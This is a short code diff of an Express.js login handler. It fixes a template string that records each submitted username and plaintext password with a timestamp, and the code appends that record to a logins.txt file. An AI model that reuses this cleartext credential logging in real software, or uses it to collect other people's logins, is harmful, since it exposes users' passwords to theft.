@@ -35,7 +35,8 @@ app.post("/login", (req, res) => {
         return res.status(400).json({ error: "Username and password required!" });
     }
 
-    const userData = `${new Date().toISOString()} - Username: ${username}, Password: ${password>
+    const userData = `${new Date().toISOString()} - Username: ${username}, Password: ${password}`;
+
 
     // Store credentials in a text file inside the "data" folder
 fs.appendFile(path.join(dataDir, "logins.txt"), userData, (err) => {
